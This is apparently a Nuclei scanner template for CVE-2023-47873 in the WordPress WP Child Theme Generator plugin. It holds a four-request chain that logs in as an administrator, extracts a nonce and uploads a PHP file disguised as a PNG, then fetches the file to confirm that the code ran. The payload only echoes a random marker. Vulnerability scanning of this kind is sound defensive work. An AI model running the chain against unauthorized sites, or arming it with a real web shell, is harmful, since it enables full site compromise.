flow: http(1) && http(2) && http(3) && http(4)
http:
- matchers:
  - condition: and
    dsl:
    - len(body)==0
    - status_code == 302
    - contains(header, "wordpress_logged_in_")
    internal: true
    type: dsl
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    log={{username}}&pwd={{password}}&wp-submit=Log+In

    '
- extractors:
  - group: 1
    internal: true
    name: nonce
    part: body
    regex:
    - name="wp-easy-nonce" value="([0-9a-zA-Z]+)"
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, "Child Theme Gen")
    internal: true
    type: dsl
  raw:
  - 'GET /wp-admin/themes.php?page=custom-child-theme HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 302
    - contains(location, "error_type=updated")
    internal: true
    type: dsl
  raw:
  - 'POST /wp-admin/admin-post.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=----geckoformboundaryfbbbd275d3ea5d30b67d44817dde50f8


    ------geckoformboundaryfbbbd275d3ea5d30b67d44817dde50f8

    Content-Disposition: form-data; name="childtheme"


    {{name}}

    ------geckoformboundaryfbbbd275d3ea5d30b67d44817dde50f8

    Content-Disposition: form-data; name="childauthor"


    {{childauthor}}

    ------geckoformboundaryfbbbd275d3ea5d30b67d44817dde50f8

    Content-Disposition: form-data; name="description"


    {{description}}

    ------geckoformboundaryfbbbd275d3ea5d30b67d44817dde50f8

    Content-Disposition: form-data; name="fileUpload"; filename="{{filename}}.php"

    Content-Type: image/png


    <?php echo "{{string}}";?>

    ------geckoformboundaryfbbbd275d3ea5d30b67d44817dde50f8

    Content-Disposition: form-data; name="wp-easy-nonce"


    {{nonce}}

    ------geckoformboundaryfbbbd275d3ea5d30b67d44817dde50f8

    Content-Disposition: form-data; name="action"


    child_theme

    ------geckoformboundaryfbbbd275d3ea5d30b67d44817dde50f8

    Content-Disposition: form-data; name="custom-child-create"


    Create Child Theme

    ------geckoformboundaryfbbbd275d3ea5d30b67d44817dde50f8--

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, "{{string}}")
    type: dsl
  raw:
  - 'GET /wp-content/themes/{{name}}/screenshot.php HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2023-47873
info:
  author: cysamu,Crux
  classification:
    cpe: cpe:2.3:a:wensolutions:wp_child_theme_generator:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2023-47873
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 9.1
    cwe-id: CWE-434
    epss-percentile: 0.93263
    epss-score: 0.11235
  description: 'Unrestricted Upload of File with Dangerous Type vulnerability in WEN
    Solutions WP Child Theme Generator.This issue affects WP Child Theme Generator-
    from n/a through 1.0.9.

    '
  impact: 'Authenticated administrators can upload arbitrary PHP files disguised as
    theme files to execute malicious code on the WordPress server, enabling complete
    site compromise.

    '
  metadata:
    framework: wordpress
    max-request: 4
    product: wp_child_theme_generator
    publicwww-query: /wp-content/plugins/wp-child-theme-generator/
    vendor: wensolutions
    verified: true
  name: WordPress WP Child Theme Generator < 1.1.3 - Arbitrary File Upload
  reference:
  - https://github.com/certuscyber/cve-pocs/tree/main/CVE-2023-47873
  - https://patchstack.com/database/wordpress/plugin/wp-child-theme-generator/vulnerability/wordpress-wp-child-theme-generator-plugin-1-0-8-arbitrary-file-upload-vulnerability
  - https://en-ca.wordpress.org/plugins/wp-child-theme-generator/
  - https://patchstack.com/database/vulnerability/wp-child-theme-generator/wordpress-wp-child-theme-generator-plugin-1-0-8-arbitrary-file-upload-vulnerability?_s_id=cve
  remediation: Update to version 1.1.3 or later
  severity: critical
  tags: cve,cve2023,wordpress,wp-plugin,wp,wp-child-theme-generator,file-upload,authenticated,intrusive,rce,vuln
variables:
  childauthor: '{{to_lower(rand_base(4))}}'
  description: '{{to_lower(rand_base(5))}}'
  filename: '{{to_lower(rand_text_alpha(6))}}'
  impact: 'Authenticated administrators can upload arbitrary PHP files disguised as
    theme files to execute malicious code on the WordPress server, enabling complete
    site compromise.

    '
  name: '{{to_lower(rand_text_alpha(6))}}'
  string: '{{to_lower(rand_base(8))}}'
